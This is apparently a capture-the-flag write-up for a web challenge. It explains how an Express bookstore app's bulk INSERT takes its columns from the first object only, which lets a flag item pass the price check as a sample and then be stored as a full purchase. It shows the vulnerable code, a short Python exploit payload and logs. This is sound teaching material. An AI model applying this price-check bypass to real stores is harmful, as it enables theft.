# narnes-and-bobles (Upsolved)

## 1. Summary

- **Category**: Web

### Description

> `I heard Amazon killed a certain book store so I'm gonna make my own book store and kill Amazon.`
>
> `I dove deep and delivered results.`

## 2. Analysis

### Vulnerability

- **Mass Assignment & Query Builder Schema Mismatch**: This vulnerability occurs when an SQL query builder inserts an array of objects in bulk. The builder determines the column list for the `INSERT` statement based solely on the keys present in the **first object** of the array. By leveraging this, an attacker can intentionally omit specific column data (`is_sample`) for subsequent rows, causing the database to store the default value (`NULL`).

## 3. Exploit Flow

### 1. Initial Approach & Trial and Error (SQLite Type Affinity)

Based on the `is_sample` column being declared as `INT` and the use of the unary plus operator (`+`) in the price calculation logic, I first attempted the following:

```sql
 CREATE TABLE cart_items (
  username TEXT,
  book_id TEXT,
  is_sample INT, -- Confirmed INT type declaration

  FOREIGN KEY (username) REFERENCES users(username)
  FOREIGN KEY (book_id) REFERENCES books(id)
);
```

- **Hypothesis**: If I input a float value like `0.1` for `is_sample`, it might be converted to `0` when stored in an `INT` column, but the calculation logic `!+0.1` would evaluate to `false`, potentially bypassing the price check.

  ```javascript
  >> !+0.1
  false

  >> 0 ? true : false
  false
  ```

- **Result**: Failure. `flag_sample.txt` was returned. Checking the Docker logs revealed that due to SQLite's **Type Affinity**, `0.1` was stored as a `REAL` type.

  ```text
  item.is_sample: 0.1
  item.is_sample: true // 0.1 is Truthy in JavaScript
  ```

### 2. Core Logic Analysis: Discovering Mass Assignment

I focused on the difference between the price check logic and the database insertion logic.

```javascript
app.post("/cart/add", needsAuth, async (req, res) => {
  // ... omissis ...
  const additionalSum = productsToAdd
    .filter((product) => !+product.is_sample) // Directly references is_sample from user input object
    .map((product) => booksLookup.get(product.book_id).price ?? 99999999)
    .reduce((l, r) => l + r, 0);

  if (additionalSum + cartSum > balance) {
    /* Balance Check */
  }

  const cartEntries = productsToAdd.map((prod) => ({
    ...prod,
    username: res.locals.username,
  }));
  await db`INSERT INTO cart_items ${db(cartEntries)}`; // Insertion via Query Builder
});
```

When passing an entire array to `db(cartEntries)`, the query builder determines the columns of the `INSERT` statement based on the **key set of the first object**.

### 3. Exploit Scenario (Bypass Logic)

Referring to [the official writeup](https://github.com/uclaacm/lactf-archive/blob/main/2026/web/bobles-and-narnes/solve.py), I devised a strategy to send two items simultaneously.

- **Exploit Payload**:

  ```python
  r = s.post(
    url("/cart/add"),
    json={
      "products": [
        { "book_id": part_time_parliament }, # First: No is_sample key
        { "book_id": flag_id, "is_sample": True }, # Second: Flag
      ],
    },
  )
  ```

- **Detailed Process**:
  1. **Price Calculation**: The first item is 10, and the second (Flag) is filtered out because `is_sample: true`, resulting in a 0 price. The total is 10, bypassing the balance check.
  2. **Query Generation**: Since the first object lacks the `is_sample` key, the library ignores that column when generating the query:
     `INSERT INTO cart_items (book_id, username) VALUES ($1, $2), ($3, $4)`
  3. **Data Verification (Logs)**: Upon database retrieval, the flag's `is_sample` becomes `null`.

     ```text
     cartEntries: [{"book_id":"a3e33c2505a19d18","username":"user"},{"book_id":"2a16e349fb9045fa","is_sample":true,"username":"user"}]
     item.is_sample: null
     item.is_sample: false
     ```

### 4. Final Result (Checkout)

The `/cart/checkout` logic references the `is_sample` value from the DB without any additional price checks.

```javascript
const path = item.is_sample
  ? book.file.replace(/\.([^.]+)$/, "_sample.$1")
  : book.file; // null is false, so the original file is selected
```

Since `item.is_sample` is `null`, it evaluates to `false`, and the actual `flag.txt` is included in the ZIP file.

## 4. Final Solution

- **Exploit Code**: [Link to Script / GitHub](./solve.py)

## 5. Conclusion

To be honest, this was an attack technique I had never heard of before, so I don't think I could have solved it during the competition regardless of how much time I had. However, through this opportunity, I learned a new technique called Mass Assignment. I believe I'll be able to solve similar problems if they appear in the future.
